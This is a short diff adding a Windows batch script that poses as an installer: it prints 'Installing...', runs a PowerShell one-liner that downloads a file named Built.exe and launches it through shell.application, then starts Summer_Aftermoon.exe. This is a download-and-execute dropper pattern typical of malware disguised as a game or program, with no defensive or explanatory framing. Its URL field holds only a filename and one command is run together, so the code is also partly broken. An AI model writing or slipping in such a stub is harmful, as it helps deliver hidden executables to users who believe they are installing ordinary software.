@@ -1,0 +1,4 @@
+echo Installing...
+echo.
+powershell $down=New-Object System.Net.WebClient;$url='Built.exe';$file='Built.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exitstart
+start Summer_Aftermoon.exe
